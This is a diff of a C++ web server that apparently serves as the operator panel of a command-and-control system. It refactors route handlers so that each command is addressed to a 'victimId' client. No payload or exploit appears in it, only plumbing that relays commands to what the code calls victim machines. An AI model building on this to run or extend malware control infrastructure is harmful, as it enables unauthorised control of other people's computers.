@@ -15,13 +15,11 @@ WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const
   nope::log::Log(Info) << "Creating WebServer";
   nope::log::Log(Debug) << "creating default and custom routes for WebServer";
 
-  m_routes["/404"] = [&](std::uint32_t askId)
+  m_routes["/404"] = [&](std::uint32_t askId, std::uint32_t victimId)
   {
-      std::uint32_t id = 0; //victim client's id
-
       nope::log::Log(Info) << "Someone is on 404";
       server::Event ev;
-      ev.destId = id;
+      ev.destId = victimId;
       ev.emitter = this;
       ev.askId = askId;
       ev.commandName = "404";
@@ -29,13 +27,11 @@ WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const
       m_responseQueue.push(ev);
   };
 
-  m_routes["/"] = [&](std::uint32_t askId)
+  m_routes["/"] = [&](std::uint32_t askId, std::uint32_t victimId)
   {
-      std::uint32_t id = 0; //victim client's id
-
       nope::log::Log(Info) << "Someone requested commandsInfo";
       server::Event ev;
-      ev.destId = id;
+      ev.destId = victimId;
       ev.emitter = this;
       ev.askId = askId;
       ev.commandName = "commandInfo";
@@ -43,13 +39,11 @@ WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const
       m_responseQueue.push(ev);
   };
 
-  m_routes["/nb"] = [&](std::uint32_t askId)
+  m_routes["/nb"] = [&](std::uint32_t askId, std::uint32_t victimId)
   {
-      std::uint32_t id = 0;
-
       nope::log::Log(Info) << "Someone requested the number of client";
       server::Event ev;
-      ev.destId = id;
+      ev.destId = victimId;
       ev.emitter = this;
       ev.askId = askId;
       ev.commandName = "clientCount";
@@ -60,18 +54,13 @@ WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const
   for (auto const &cur : m_commands)
   {
     nope::log::Log(Info) << "route: " << cur.name;
-    m_routes["/" + cur.name] = [&](std::uint32_t askId)
+    m_routes["/" + cur.name] = [&](std::uint32_t askId, std::uint32_t victimId)
     {
-      std::uint32_t id = 0; //victim client's id
-
       std::string url ("/" + cur.name);
-      std::stringstream ss(url.substr(url.find_last_of("/") + 1));
-      ss >> id;
-
-      nope::log::Log(Info) << "route for: " << url << " requested on client " << id;
+      nope::log::Log(Info) << "route for: " << url << " requested on client " << victimId;
 
       server::Event ev;
-      ev.destId = id;
+      ev.destId = victimId;
       ev.emitter = this;
       ev.askId = askId;
       ev.commandName = cur.name;
@@ -173,7 +162,7 @@ void WebServer::checkResponse()
 }
 
 void WebServer::acceptClient(boost::asio::ip::tcp::acceptor &acceptor, boost::asio::io_service &io_service,
-    std::map<std::string, std::function<void(std::uint32_t)>> &routes, std::uint32_t &clientCount, std::vector<std::shared_ptr<HTTPUserSession>> &clients)
+    std::map<std::string, std::function<void(std::uint32_t, std::uint32_t)>> &routes, std::uint32_t &clientCount, std::vector<std::shared_ptr<HTTPUserSession>> &clients)
 {
   std::shared_ptr<HTTPUserSession> client = std::make_shared<HTTPUserSession>(io_service, routes, clientCount++);
   clients.push_back(client);
@@ -191,7 +180,7 @@ void WebServer::acceptClient(boost::asio::ip::tcp::acceptor &acceptor, boost::as
       });
 }
 
-void WebServer::addRoute(std::string url, std::function<void(std::uint32_t)> x)
+void WebServer::addRoute(std::string url, std::function<void(std::uint32_t, std::uint32_t)> x)
 {
   m_routes[url] = x;
 }
